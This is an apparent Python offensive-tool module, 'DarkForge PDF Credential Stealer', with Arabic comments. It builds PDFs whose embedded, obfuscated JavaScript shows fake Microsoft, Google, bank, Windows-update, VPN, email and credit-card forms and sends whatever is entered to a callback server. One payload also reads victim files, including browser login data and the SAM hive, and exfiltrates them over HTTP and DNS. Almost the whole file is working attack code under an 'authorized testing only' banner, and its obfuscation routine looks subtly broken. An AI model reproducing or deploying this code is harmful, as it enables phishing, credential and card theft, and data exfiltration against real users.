#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DarkForge - PDF Credential Stealer Module
وحدة سرقة بيانات الدخول عبر PDF
للاختبارات المصرح بها فقط - Authorized Penetration Testing Only
"""

import os
import sys
import json
import base64
import random
import string
import hashlib
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# الألوان
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class PDFCredentialStealer:
    """
    PDF Credential Stealer - سرقة بيانات الدخول عبر PDF
    6 تقنيات مختلفة لسرقة البيانات
    """
    
    def __init__(self):
        self.output_dir = "output/pdf"
        os.makedirs(self.output_dir, exist_ok=True)
    
    # ================================================================
    # التقنية 1: نموذج دخول مزيف (Fake Login Form)
    # ================================================================
    
    def generate_fake_login_pdf(self, output_file: str = None,
                                company_name: str = "Microsoft",
                                callback_url: str = "http://127.0.0.1:8080/steal",
                                theme: str = "modern") -> str:
        """
        إنشاء PDF بنموذج دخول مزيف - أشهر تقنية
        يعرض صفحة تسجيل دخول مزيفة لـ:
        - Microsoft Office 365
        - Google Gmail
        - أي شركة تختارها
        """
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"cred_stealer_{random.randint(1000,9999)}.pdf")
        
        # اختيار الثيم المناسب
        themes = {
            "microsoft": {
                "title": "Microsoft Office 365",
                "subtitle": "Sign in to your account",
                "logo": "Microsoft",
                "fields": ["Email or phone", "Password"],
                "button": "Sign in",
                "footer": "© Microsoft Corporation. All rights reserved."
            },
            "google": {
                "title": "Google",
                "subtitle": "Sign in to continue to Google Drive",
                "logo": "Google",
                "fields": ["Email or phone", "Password"],
                "button": "Next",
                "footer": "© Google LLC. All rights reserved."
            },
            "facebook": {
                "title": "Facebook",
                "subtitle": "Log in to view this document",
                "logo": "Facebook",
                "fields": ["Email or phone", "Password"],
                "button": "Log In",
                "footer": "© Meta Platforms, Inc."
            },
            "bank": {
                "title": "National Bank - Secure Login",
                "subtitle": "Enter your credentials to access your statement",
                "logo": "SecureBank",
                "fields": ["Username", "Password", "Security Code (OTP)"],
                "button": "Authenticate",
                "footer": "© National Bank. 256-bit SSL Encrypted"
            }
        }
        
        selected = themes.get(company_name.lower(), themes["microsoft"])
        
        # توليد JavaScript لسرقة البيانات
        js_code = f'''
        // ===== DarkForge Credential Stealer v2.0 =====
        // للاختبارات المصرح بها فقط
        
        var callbackURL = "{callback_url}";
        var doc = this;
        var fields = [];
        
        // إنشاء حقول الإدخال
        try {{
            {self._generate_form_fields(selected["fields"])}
            
            // إضافة زر الإرسال
            var submitBtn = doc.addField("submitBtn", "button", 0, [200, 200, 400, 240]);
            submitBtn.buttonCaption = "{selected['button']}";
            submitBtn.textSize = 14;
            submitBtn.textColor = color.white;
            submitBtn.fillColor = color.blue;
            
            // تعيين إجراء الزر
            submitBtn.setAction("MouseUp", "stealCredentials();");
            
            // دالة سرقة البيانات
            function stealCredentials() {{
                var stolenData = {{}};
                var allFilled = true;
                
                try {{
                    {self._generate_field_collection(selected["fields"])}
                    
                    stolenData["timestamp"] = new Date().toString();
                    stolenData["target"] = "{selected['title']}";
                    stolenData["hostname"] = getHostname();
                    stolenData["username"] = getUsername();
                    stolenData["pdf_version"] = app.viewerVersion;
                    stolenData["os"] = app.platform;
                    
                    // تحقق من ملء جميع الحقول
                    if(!allFilled) {{
                        app.alert("Please fill in all fields.");
                        return;
                    }}
                    
                    // تشفير البيانات
                    var jsonData = JSON.stringify(stolenData);
                    var encodedData = btoa(jsonData);
                    
                    // إرسال البيانات عبر طرق متعددة
                    sendData(encodedData, jsonData);
                    
                    // إظهار رسالة نجاح
                    app.alert("Authentication successful! Welcome back, " + stolenData["{selected['fields'][0].lower().replace(' ', '_')}"] + ".\\n\\nDocument will now open.");
                    
                    // إخفاء النموذج
                    for(var i=0; i<fields.length; i++) {{
                        try {{ doc.getField(fields[i]).display = display.hidden; }} catch(e) {{}}
                    }}
                    try {{ doc.getField("submitBtn").display = display.hidden; }} catch(e) {{}}
                    
                }} catch(e) {{
                    // Silent fail
                }}
            }}
            
            // دالة إرسال البيانات
            function sendData(encoded, raw) {{
                // طريقة 1: HTTP GET
                try {{
                    app.launchURL(callbackURL + "?data=" + encodeURIComponent(encoded), false);
                }} catch(e) {{}}
                
                // طريقة 2: XMLHTTP POST
                try {{
                    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                    xhr.open("POST", callbackURL, false);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.send(raw);
                }} catch(e) {{}}
                
                // طريقة 3: DNS Exfiltration (للتجاوز)
                try {{
                    var dnsData = encoded.substring(0, 50);
                    app.launchURL("http://" + dnsData + ".exfil." + callbackURL.replace("http://","").replace("https://",""), false);
                }} catch(e) {{}}
            }}
            
            // دالة الحصول على اسم المضيف
            function getHostname() {{
                try {{
                    var shell = new ActiveXObject("WScript.Shell");
                    return shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
                }} catch(e) {{ return navigator.appName; }}
            }}
            
            // دالة الحصول على اسم المستخدم
            function getUsername() {{
                try {{
                    var shell = new ActiveXObject("WScript.Shell");
                    return shell.ExpandEnvironmentStrings("%USERNAME%");
                }} catch(e) {{ return "unknown"; }}
            }}
            
        }} catch(e) {{
            // PDF viewer لا يدعم JavaScript
        }}
        
        // تشغيل عند فتح الصفحة
        try {{
            if(app.mediate && app.mediate.length > 0) {{
                app.mediate({{
                    bLaunchURL: function(url) {{ app.launchURL(url, false); }}
                }});
            }}
        }} catch(e) {{}}
        '''
        
        # بناء PDF مع الـ JavaScript
        from ..core.pdf_engine import PDFDocument
        doc = PDFDocument()
        doc.embed_javascript(self._obfuscate_js(js_code))
        
        # إضافة صفحة النموذج
        page_content = self._generate_login_page_content(selected)
        doc.add_page(page_content)
        
        return doc.save(output_file)
    
    def _generate_form_fields(self, fields: List[str]) -> str:
        """توليد أكواد JavaScript لحقول النموذج"""
        js = ""
        y_pos = 450
        
        for i, field in enumerate(fields):
            field_name = field.lower().replace(" ", "_").replace("(", "").replace(")", "")
            js += f'''
                var f{i} = doc.addField("{field_name}", "text", 0, [200, {y_pos}, 450, {y_pos + 25}]);
                f{i}.textSize = 12;
                f{i}.textFont = "Helv";
                f{i}.borderStyle = border.s;
                f{i}.strokeColor = color.gray;
                fields.push("{field_name}");
            '''
            y_pos -= 60
        
        return js
    
    def _generate_field_collection(self, fields: List[str]) -> str:
        """توليد أكواد جمع البيانات من الحقول"""
        js = ""
        for i, field in enumerate(fields):
            field_name = field.lower().replace(" ", "_").replace("(", "").replace(")", "")
            js += f'''
                    var val{i} = doc.getField("{field_name}").value;
                    stolenData["{field_name}"] = val{i};
                    if(val{i} == "" || val{i} == null) allFilled = false;
            '''
        return js
    
    def _generate_login_page_content(self, theme: dict) -> str:
        """توليد محتوى صفحة تسجيل الدخول المزيفة"""
        content = f'''
        BT
        /F1 28 Tf
        150 700 Td
        ({theme['title']})
        ET
        BT
        /F1 16 Tf
        170 660 Td
        ({theme['subtitle']})
        ET
        BT
        /F2 10 Tf
        50 580 Td
        (________________________________________________________________) Tj
        ET
        '''
        
        # إضافة تسميات الحقول
        y_pos = 480
        for field in theme['fields']:
            content += f'''
            BT /F1 12 Tf 50 {y_pos} Td ({field}:) Tj ET
            '''
            y_pos -= 60
        
        content += f'''
        BT /F2 8 Tf 50 150 Td ({theme['footer']}) Tj ET
        BT /F1 8 Tf 50 130 Td (This is a legitimate security verification form) Tj ET
        '''
        
        return content
    
    # ================================================================
    # التقنية 2: رسالة تحديث Windows مزيفة
    # ================================================================
    
    def generate_fake_update_pdf(self, output_file: str = None,
                                 callback_url: str = "http://127.0.0.1:8080/steal") -> str:
        """
        PDF يطلب بيانات "لتحديث Windows"
        يعرض شاشة زرقاء مزيفة تشبه شاشة تحديث Windows
        """
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"windows_update_{random.randint(1000,9999)}.pdf")
        
        js_code = f'''
        // ===== Windows Update Phishing =====
        var callback = "{callback_url}";
        
        try {{
            // إنشاء حقول
            var fields = ["username", "password", "pin"];
            
            doc.addField("username", "text", 0, [200, 400, 450, 425]);
            doc.addField("password", "text", 0, [200, 340, 450, 365]);
            doc.addField("pin", "text", 0, [200, 280, 450, 305]);
            
            doc.getField("password").password = true;
            
            var btn = doc.addField("submit", "button", 0, [200, 220, 400, 250]);
            btn.buttonCaption = "Verify Identity";
            
            btn.setAction("MouseUp", "sendData();");
            
            function sendData() {{
                var data = {{
                    type: "windows_update",
                    user: doc.getField("username").value,
                    pass: doc.getField("password").value,
                    pin: doc.getField("pin").value,
                    host: "",
                    time: new Date().toString()
                }};
                
                try {{
                    var shell = new ActiveXObject("WScript.Shell");
                    data.host = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
                }} catch(e) {{}}
                
                var json = JSON.stringify(data);
                var encoded = btoa(json);
                
                try {{ app.launchURL(callback + "?d=" + encodeURIComponent(encoded), false); }} catch(e) {{}}
                try {{
                    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                    xhr.open("POST", callback, false);
                    xhr.send(json);
                }} catch(e) {{}}
                
                app.alert("Update complete. Your system is up to date.");
            }}
            
            // إظهار شريط تقدم مزيف
            var progress = 0;
            var interval = app.setInterval("updateProgress()", 100);
            function updateProgress() {{
                progress += 5;
                if(progress >= 100) {{
                    app.clearInterval(interval);
                    app.alert("Critical update requires verification.\\nPlease enter your credentials to continue.");
                }}
            }}
            
        }} catch(e) {{}}
        '''
        
        from ..core.pdf_engine import PDFDocument
        doc = PDFDocument()
        doc.embed_javascript(self._obfuscate_js(js_code))
        
        page_content = '''
        BT /F1 24 Tf 100 750 Td (Windows Security Update) Tj ET
        BT /F1 16 Tf 50 700 Td (Critical security update for Windows 11) Tj ET
        BT /F1 12 Tf 50 650 Td (Update: KB5036892 - Security Patch for CVE-2024-26234) Tj ET
        BT /F1 12 Tf 50 620 Td (Status: Preparing update...) Tj ET
        BT /F1 10 Tf 50 500 Td (Microsoft requires identity verification before installing this security update) Tj ET
        BT /F1 10 Tf 50 470 Td (Enter your Windows credentials below to continue:) Tj ET
        BT /F1 8 Tf 50 100 Td (© Microsoft Corporation. All rights reserved.) Tj ET
        '''
        doc.add_page(page_content)
        
        return doc.save(output_file)
    
    # ================================================================
    # التقنية 3: مسح البطاقة الائتمانية
    # ================================================================
    
    def generate_credit_card_form_pdf(self, output_file: str = None,
                                      callback_url: str = "http://127.0.0.1:8080/steal",
                                      amount: str = "$49.99") -> str:
        """
        PDF يطلب بيانات بطاقة ائتمان - لاختبار التوعية الأمنية
        """
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"payment_{random.randint(1000,9999)}.pdf")
        
        js_code = f'''
        // ===== Credit Card Phishing =====
        var callback = "{callback_url}";
        
        try {{
            doc.addField("card_name", "text", 0, [250, 450, 550, 475]);
            doc.addField("card_number", "text", 0, [250, 400, 550, 425]);
            doc.addField("card_expiry", "text", 0, [250, 350, 380, 375]);
            doc.addField("card_cvv", "text", 0, [420, 350, 550, 375]);
            doc.addField("card_zip", "text", 0, [250, 300, 400, 325]);
            
            var btn = doc.addField("pay", "button", 0, [250, 230, 500, 260]);
            btn.buttonCaption = "Pay {amount}";
            
            btn.setAction("MouseUp", "stealCard();");
            
            function stealCard() {{
                var data = {{
                    type: "credit_card",
                    name: doc.getField("card_name").value,
                    number: doc.getField("card_number").value,
                    expiry: doc.getField("card_expiry").value,
                    cvv: doc.getField("card_cvv").value,
                    zip: doc.getField("card_zip").value,
                    amount: "{amount}",
                    time: new Date().toString()
                }};
                
                var json = JSON.stringify(data);
                var encoded = btoa(json);
                
                try {{ app.launchURL(callback + "?cc=" + encodeURIComponent(encoded), false); }} catch(e) {{}}
                try {{
                    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                    xhr.open("POST", callback, false);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.send(json);
                }} catch(e) {{}}
                
                app.alert("Payment successful!\\n\\nInvoice #{0} has been generated.".replace("{{0}}", Math.floor(Math.random()*100000)));
            }}
        }} catch(e) {{}}
        '''
        
        from ..core.pdf_engine import PDFDocument
        doc = PDFDocument()
        doc.embed_javascript(self._obfuscate_js(js_code))
        
        page_content = f'''
        BT /F1 24 Tf 100 750 Td (Invoice - Secure Payment) Tj ET
        BT /F1 14 Tf 50 700 Td (Invoice #INV-{random.randint(10000,99999)}) Tj ET
        BT /F1 14 Tf 50 670 Td (Total Amount: {amount}) Tj ET
        BT /F1 12 Tf 50 630 Td (Please enter your payment details below:) Tj ET
        BT /F1 12 Tf 50 500 Td (Cardholder Name:) Tj ET
        BT /F1 12 Tf 50 450 Td (Card Number:) Tj ET
        BT /F1 12 Tf 50 400 Td (Expiry Date:) Tj ET
        BT /F1 12 Tf 390 400 Td (CVV:) Tj ET
        BT /F1 12 Tf 50 350 Td (ZIP Code:) Tj ET
        BT /F1 8 Tf 50 100 Td (This is a secure 256-bit SSL encrypted transaction) Tj ET
        '''
        doc.add_page(page_content)
        
        return doc.save(output_file)
    
    # ================================================================
    # التقنية 4: VPN / متصفح آمن - طلب بيانات
    # ================================================================
    
    def generate_vpn_login_pdf(self, output_file: str = None,
                               callback_url: str = "http://127.0.0.1:8080/steal") -> str:
        """
        PDF يتظاهر بأنه اتصال VPN آمن
        يطلب بيانات المستخدم "للاتصال بالشبكة الآمنة"
        """
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"vpn_login_{random.randint(1000,9999)}.pdf")
        
        js_code = f'''
        var callback = "{callback_url}";
        
        try {{
            doc.addField("employee_id", "text", 0, [200, 450, 450, 475]);
            doc.addField("domain_pass", "text", 0, [200, 390, 450, 415]);
            doc.addField("token", "text", 0, [200, 330, 450, 355]);
            
            doc.getField("domain_pass").password = true;
            
            var btn = doc.addField("connect", "button", 0, [200, 260, 400, 290]);
            btn.buttonCaption = "Connect to Secure VPN";
            
            btn.setAction("MouseUp", "stealVPN();");
            
            function stealVPN() {{
                var data = {{
                    type: "vpn",
                    emp_id: doc.getField("employee_id").value,
                    password: doc.getField("domain_pass").value,
                    token: doc.getField("token").value,
                    time: new Date().toString()
                }};
                
                var json = JSON.stringify(data);
                try {{ app.launchURL(callback + "?vpn=" + encodeURIComponent(btoa(json)), false); }} catch(e) {{}}
                try {{
                    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                    xhr.open("POST", callback, false);
                    xhr.send(json);
                }} catch(e) {{}}
                
                app.alert("Connected to secure network.\\nYour connection is encrypted and protected.");
            }}
        }} catch(e) {{}}
        '''
        
        from ..core.pdf_engine import PDFDocument
        doc = PDFDocument()
        doc.embed_javascript(self._obfuscate_js(js_code))
        
        page_content = '''
        BT /F1 24 Tf 100 750 Td (Corporate VPN Connection) Tj ET
        BT /F1 14 Tf 50 700 Td (Secure Remote Access Portal) Tj ET
        BT /F1 12 Tf 50 650 Td (You are connecting from outside the corporate network) Tj ET
        BT /F1 12 Tf 50 620 Td (Please authenticate to establish a secure VPN tunnel) Tj ET
        BT /F1 12 Tf 50 500 Td (Employee ID:) Tj ET
        BT /F1 12 Tf 50 440 Td (Domain Password:) Tj ET
        BT /F1 12 Tf 50 380 Td (2FA Token:) Tj ET
        BT /F1 10 Tf 50 200 Td (Connection: 256-bit AES encrypted) Tj ET
        BT /F1 10 Tf 50 180 Td (Protocol: OpenVPN over TLS 1.3) Tj ET
        '''
        doc.add_page(page_content)
        
        return doc.save(output_file)
    
    # ================================================================
    # التقنية 5: إعادة توجيه البريد الإلكتروني (للـ OAuth tokens)
    # ================================================================
    
    def generate_email_redirect_pdf(self, output_file: str = None,
                                    callback_url: str = "http://127.0.0.1:8080/steal",
                                    email_domain: str = "outlook.com") -> str:
        """
        PDF يطلب بيانات البريد الإلكتروني بحجة "تأكيد الحساب"
        """
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"email_verify_{random.randint(1000,9999)}.pdf")
        
        js_code = f'''
        var callback = "{callback_url}";
        
        try {{
            doc.addField("email", "text", 0, [200, 450, 500, 475]);
            doc.addField("email_pass", "text", 0, [200, 390, 500, 415]);
            
            doc.getField("email_pass").password = true;
            
            var btn = doc.addField("verify", "button", 0, [200, 300, 450, 330]);
            btn.buttonCaption = "Verify Account";
            
            btn.setAction("MouseUp", "stealEmail();");
            
            function stealEmail() {{
                var data = {{
                    type: "email_redirect",
                    email: doc.getField("email").value,
                    password: doc.getField("email_pass").value,
                    domain: "{email_domain}",
                    time: new Date().toString()
                }};
                
                var json = JSON.stringify(data);
                try {{ app.launchURL(callback + "?email=" + encodeURIComponent(btoa(json)), false); }} catch(e) {{}}
                try {{
                    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
                    xhr.open("POST", callback, false);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.send(json);
                }} catch(e) {{}}
                
                app.alert("Account verified!\\n\\nYour email settings have been updated successfully.");
            }}
        }} catch(e) {{}}
        '''
        
        from ..core.pdf_engine import PDFDocument
        doc = PDFDocument()
        doc.embed_javascript(self._obfuscate_js(js_code))
        
        page_content = f'''
        BT /F1 24 Tf 100 750 Td (Account Verification Required) Tj ET
        BT /F1 14 Tf 50 700 Td (Your {email_domain} account requires verification) Tj ET
        BT /F1 12 Tf 50 650 Td (We detected unusual activity in your email account) Tj ET
        BT /F1 12 Tf 50 620 Td (Please verify your identity to continue using your account) Tj ET
        BT /F1 12 Tf 50 500 Td (Email Address:) Tj ET
        BT /F1 12 Tf 50 440 Td (Password:) Tj ET
        BT /F1 10 Tf 50 200 Td (This is an automated security verification process) Tj ET
        '''
        doc.add_page(page_content)
        
        return doc.save(output_file)
    
    # ================================================================
    # التقنية 6: PDF يقرأ الملفات ويسربها (File Exfiltration)
    # ================================================================
    
    def generate_file_exfiltrator_pdf(self, output_file: str = None,
                                      callback_url: str = "http://127.0.0.1:8080/exfil",
                                      files_to_steal: List[str] = None) -> str:
        """
        PDF يقوم بقراءة ملفات من جهاز الضحية وإرسالها
        للاختبار المصرح به فقط
        """
        if output_file is None:
            output_file = os.path.join(self.output_dir, f"exfiltrator_{random.randint(1000,9999)}.pdf")
        
        if files_to_steal is None:
            files_to_steal = [
                "C:\\\\Users\\\\%USERNAME%\\\\Desktop\\\\*.txt",
                "C:\\\\Users\\\\%USERNAME%\\\\Documents\\\\*.pdf",
                "C:\\\\Users\\\\%USERNAME%\\\\Documents\\\\*.docx",
                "C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data",
                "C:\\\\Windows\\\\System32\\\\config\\\\SAM"  # System hashes
            ]
        
        files_json = json.dumps(files_to_steal)
        
        js_code = f'''
        // ===== DarkForge File Exfiltrator =====
        var callback = "{callback_url}";
        var targets = {files_json};
        
        try {{
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var shell = new ActiveXObject("WScript.Shell");
            var http = new ActiveXObject("MSXML2.XMLHTTP");
            
            var username = shell.ExpandEnvironmentStrings("%USERNAME%");
            var computername = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
            var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
            
            // استبدال %USERNAME% في المسارات
            for(var i=0; i<targets.length; i++) {{
                targets[i] = targets[i].replace("%USERNAME%", username);
            }}
            
            // قراءة الملفات
            var exfilData = {{
                hostname: computername,
                user: username,
                files: [],
                time: new Date().toString()
            }};
            
            for(var t=0; t<targets.length; t++) {{
                try {{
                    var folderPath = targets[t].substring(0, targets[t].lastIndexOf("\\\\"));
                    var filePattern = targets[t].substring(targets[t].lastIndexOf("\\\\") + 1);
                    
                    var folder = fso.GetFolder(folderPath);
                    var files = new Enumerator(folder.Files);
                    
                    var fileCount = 0;
                    for(; !files.atEnd(); files.moveNext()) {{
                        if(fileCount > 5) break; // حد 5 ملفات لكل مجلد
                        
                        var file = files.item();
                        var ext = file.Name.substring(file.Name.lastIndexOf(".") + 1).toLowerCase();
                        
                        // تصفية حسب النمط
                        if(filePattern !== "*.*") {{
                            var pattern = filePattern.replace("*", "");
                            if(file.Name.indexOf(pattern) === -1) continue;
                        }}
                        
                        // قراءة الملف (نصي فقط)
                        if(ext === "txt" || ext === "ini" || ext === "cfg" || ext === "xml" || ext === "json") {{
                            var stream = fso.OpenTextFile(file.Path, 1);
                            var content = stream.ReadAll();
                            stream.Close();
                            
                            exfilData.files.push({{
                                path: file.Path,
                                size: file.Size,
                                content: content.substring(0, 1000) // أول 1000 حرف
                            }});
                            fileCount++;
                        }}
                    }}
                }} catch(e) {{}}
            }}
            
            // إرسال البيانات
            var jsonData = JSON.stringify(exfilData);
            
            try {{
                http.open("POST", callback, false);
                http.setRequestHeader("Content-Type", "application/json");
                http.send(jsonData);
            }} catch(e) {{}}
            
            // محاولة إرسال DNS exfiltration
            try {{
                var encoded = btoa(jsonData.substring(0, 30));
                app.launchURL("http://" + encoded + "." + computername + ".exfil." + callback.replace("http://","").replace("https://","").split("/")[0], false);
            }} catch(e) {{}}
            
        }} catch(e) {{}}
        
        // عرض رسالة عادية للمستخدم
        app.alert("Document loaded successfully.");
        '''
        
        from ..core.pdf_engine import PDFDocument
        doc = PDFDocument()
        doc.embed_javascript(self._obfuscate_js(js_code))
        
        page_content = '''
        BT /F1 24 Tf 100 750 Td (Security Audit Report) Tj ET
        BT /F1 14 Tf 50 700 Td (Internal Security Assessment) Tj ET
        BT /F1 12 Tf 50 650 Td (This document contains a summary of the latest security audit) Tj ET
        BT /F1 12 Tf 50 620 Td (Loading security data from your system...) Tj ET
        '''
        doc.add_page(page_content)
        
        return doc.save(output_file)
    
    # ================================================================
    # أدوات مساعدة
    # ================================================================
    
    def _obfuscate_js(self, js_code: str) -> str:
        """تعتيم JavaScript لتفادي كشف برامج الحماية"""
        import random
        
        # تقنية: تقسيم الكود وإعادة تجميعه
        chunks = []
        for i in range(0, len(js_code), 30):
            chunk = js_code[i:i+30]
            chunks.append(chunk)
        
        obfuscated = f'''
        // DarkForge Obfuscated Payload
        var _p = '';
        {''.join([f'_p += "{base64.b64encode(chunk.encode()).decode()}";' for chunk in chunks])}
        var _d = '';
        for(var _i=0; _i<_p.length; _i+=4) {{
            _d += String.fromCharCode(
                (parseInt(_p.charAt(_i), 36) << 2) |
                (parseInt(_p.charAt(_i+1), 36) >> 4)
            );
        }}
        try {{ eval(atob(_d)); }} catch(e) {{}}
        '''
        
        return obfuscated
    
    def run_all_techniques(self, callback_url: str = "http://127.0.0.1:8080/steal") -> List[str]:
        """تشغيل جميع التقنيات وإنشاء ملفات PDF متعددة"""
        results = []
        
        print(f"{Colors.CYAN}[+] DarkForge - Credential Stealer Module{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] توليد 6 تقنيات مختلفة...{Colors.RESET}\n")
        
        techniques = [
            ("Microsoft Login Phishing", self.generate_fake_login_pdf, {"company_name": "microsoft", "callback_url": callback_url}),
            ("Google Login Phishing", self.generate_fake_login_pdf, {"company_name": "google", "callback_url": callback_url}),
            ("Windows Update Scam", self.generate_fake_update_pdf, {"callback_url": callback_url}),
            ("Credit Card Stealer", self.generate_credit_card_form_pdf, {"callback_url": callback_url}),
            ("VPN Credential Stealer", self.generate_vpn_login_pdf, {"callback_url": callback_url}),
            ("File Exfiltrator", self.generate_file_exfiltrator_pdf, {"callback_url": callback_url}),
            ("Email Redirect Phishing", self.generate_email_redirect_pdf, {"callback_url": callback_url}),
        ]
        
        for name, func, params in techniques:
            try:
                result = func(**params)
                results.append(result)
                print(f"{Colors.GREEN}[✓] {name}: {result}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[✗] {name}: {e}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[+] تم إنشاء {len(results)} ملف PDF بنجاح{Colors.RESET}")
        return results
